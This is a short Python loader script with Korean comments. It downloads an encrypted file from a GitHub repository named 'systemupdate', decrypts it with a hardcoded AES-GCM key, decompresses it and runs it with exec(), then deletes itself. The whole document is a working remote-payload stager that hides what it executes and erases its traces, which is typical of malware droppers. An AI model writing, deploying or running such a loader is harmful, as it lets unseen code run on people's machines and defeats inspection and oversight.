# -*- coding: utf-8 -*-
"""뚱시스템 로더 — data.txt AES 복호화 + 실행"""
import urllib.request, base64, zlib, json, time
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

KEY = base64.b64decode("W5EwW1vV8EFoNKQsgTCrKmfZzbflm0JDU7MuNG8izu4=")
URL = "https://api.github.com/repos/blacknut0319-del/systemupdate/contents/data.txt"

try:
    req = urllib.request.Request(URL, headers={"User-Agent": "ddong"})
    b64_str = base64.b64decode(json.loads(urllib.request.urlopen(req, timeout=10).read())["content"]).decode("utf-8")
    raw = base64.b64decode(b64_str)
    g = AESGCM(KEY)
    n, e = raw[:12], raw[12:]
    code = zlib.decompress(g.decrypt(n, e, None)).decode("utf-8")
    exec(code)
except Exception as err:
    import ctypes
    ctypes.windll.user32.MessageBoxW(0, f"실행 실패: {err}", "오류", 0x10)
finally:
    try: __import__('os').remove(__file__)
    except: pass
